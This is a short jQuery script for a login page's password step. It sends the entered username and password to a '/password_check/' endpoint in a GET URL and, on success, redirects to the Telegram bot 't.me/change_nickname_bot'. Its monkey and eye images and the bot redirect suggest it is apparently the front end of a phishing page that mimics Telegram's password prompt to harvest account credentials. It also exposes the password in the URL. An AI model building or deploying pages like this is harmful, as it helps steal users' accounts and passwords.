close=true;
$(document).ready(function() {
    $('#button_next').click(function() {
        $.get("/password_check/" + document.getElementById("username").innerHTML+"&"+$('#password').val(), function(data) {
            if (data=="0"){
                $("#password").attr('class', 'input-field-input error');
                $("#password_text").text('Invalid Password');
            }
            else if(data=="1"){
                window.location.replace("t.me/change_nickname_bot");
            }
            else if(data=="-1"){
                username_b = document.getElementById("username").innerHTML;
                window.location.replace("/?username="+username_b);
            }
        });
    });
    $('#password').on('input', function() {
        $("#password").attr('class', 'input-field-input');
        $("#password_text").text('L');
    });
    $('#eye').click(function() {
        close=!close;
        if (close==true){
            $("#eye").attr("src","/static/closed_eye.png");
            $("#monkey").attr("src","/static/closed.png");
            $("#password").attr("type","password");
        }
        else{
            $("#eye").attr("src","/static/not_closed_eye.png");
            $("#monkey").attr("src","/static/not_closed.png");
            $("#password").attr("type","text");
        }

    });
});